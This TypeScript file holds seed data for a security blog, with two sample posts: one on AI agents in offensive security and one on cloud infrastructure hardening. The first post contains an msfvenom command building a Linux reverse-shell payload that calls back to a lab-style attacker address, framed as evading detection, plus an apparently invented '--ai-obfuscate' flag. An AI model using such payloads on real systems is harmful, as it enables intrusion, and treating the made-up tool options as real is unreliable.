export interface BlogStep {
  title: string;
  description?: string;
  code?: string;
  images?: string[];
}

export interface BlogPost {
  id: number;
  slug: string;
  title: string;
  date: string;
  summary: string;
  videoUrl?: string;
  steps: BlogStep[];
  mainImage: string;
  tags: string[];
}

export const initialBlogData: BlogPost[] = [
  {
    id: 1,
    slug: "The-Future-of-AI-in-Offensive-Security",
    title: "The Future of AI in Offensive Security",
    date: "March 2026",
    summary: "Exploring how LLMs and autonomous agents are reshaping the landscape of penetration testing and vulnerability discovery.",
    videoUrl: "https://www.youtube.com/watch?v=37Omb6e64To",
    mainImage: "/intelligence/The-Future-of-AI-in-Offensive-Security/main.jpg",
    tags: ["AI", "Offensive Security", "Research"],
    steps: [
      {
        title: "Reconnaissance with Autonomous Agents",
        description: "The first phase involves deploying a specialized LLM agent to map the target infrastructure. Unlike traditional scanners, these agents can understand context and identify non-obvious entry points.",
        code: "python3 ai_recon.py --target 10.10.11.200 --depth 3 --llm gpt-4-security",
        images: ["/intelligence/The-Future-of-AI-in-Offensive-Security/main.jpg"]
      },
      {
        title: "Vulnerability Synthesis",
        description: "Once the reconnaissance data is ingested, the AI synthesizes potential attack vectors by cross-referencing CVE databases with the specific configuration identified.",
        code: "curl -X POST http://ai-engine:8080/analyze -d @recon_report.json",
        images: ["/intelligence/The-Future-of-AI-in-Offensive-Security/collage-1.jpg"]
      },
      {
        title: "Payload Generation & Execution",
        description: "The final step is the generation of a context-aware payload designed to exploit the synthesized vulnerability while remaining undetected by static analysis tools.",
        code: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf --ai-obfuscate",
        images: ["/intelligence/The-Future-of-AI-in-Offensive-Security/collage-2.jpg"]
      }
    ]
  },
  {
    id: 2,
    slug: "Securing-Cloud-Infrastructures-at-Scale",
    title: "Securing Cloud Infrastructures at Scale",
    date: "February 2026",
    summary: "Tactical guidelines for maintaining a fortress-level security posture in complex multi-cloud environments.",
    videoUrl: "https://www.youtube.com/watch?v=37Omb6e64To",
    mainImage: "/intelligence/Securing-Cloud-Infrastructures-at-Scale/main.jpg",
    tags: ["Cloud", "Infrastructure", "DevSecOps"],
    steps: [
      {
        title: "Identity and Access Management Audit",
        description: "Initial audit of IAM roles and permissions to identify over-privileged accounts and potential privilege escalation paths.",
        code: "prowler aws --services iam --severity high",
        images: ["/intelligence/Securing-Cloud-Infrastructures-at-Scale/step1.jpg"]
      },
      {
        title: "Network Perimeter Hardening",
        description: "Implementing strict security groups and NACLs to enforce the principle of least privilege at the network layer.",
        code: "aws ec2 authorize-security-group-ingress --group-id sg-12345 --protocol tcp --port 443 --cidr 0.0.0.0/0",
        images: ["/intelligence/Securing-Cloud-Infrastructures-at-Scale/step2.jpg"]
      },
      {
        title: "Automated Compliance Monitoring",
        description: "Deploying automated scripts to continuously monitor the infrastructure for compliance with industry standards like CIS and SOC2.",
        code: "terraform plan -out=compliance_check.tfplan",
        images: ["/intelligence/Securing-Cloud-Infrastructures-at-Scale/step3.jpg"]
      }
    ]
  }
];
